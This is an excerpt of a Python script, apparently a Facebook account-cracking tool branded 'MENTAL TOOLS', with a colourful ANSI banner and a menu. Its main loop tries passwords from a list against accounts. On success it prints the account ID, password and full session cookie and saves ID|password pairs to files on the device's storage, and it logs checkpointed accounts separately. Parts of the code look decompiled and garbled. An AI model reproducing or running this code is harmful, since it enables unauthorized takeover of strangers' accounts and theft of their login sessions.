...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/Itz.Mental.Brand')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mMENTAL\33[0;m\033[1;32m && \033[1;33mADNANO\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Jawad Ahmad
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mMENTAL-XD
...
\033[1;37m================= \33[32;45mMR\33[0;m =====================
       ...
       \33[37;41m\t WELLCOME TO MENTAL TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(MENTAL-OK🔥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/MENTAL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(MENTAL-CP🤕)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/MENTAL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[MENTAL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
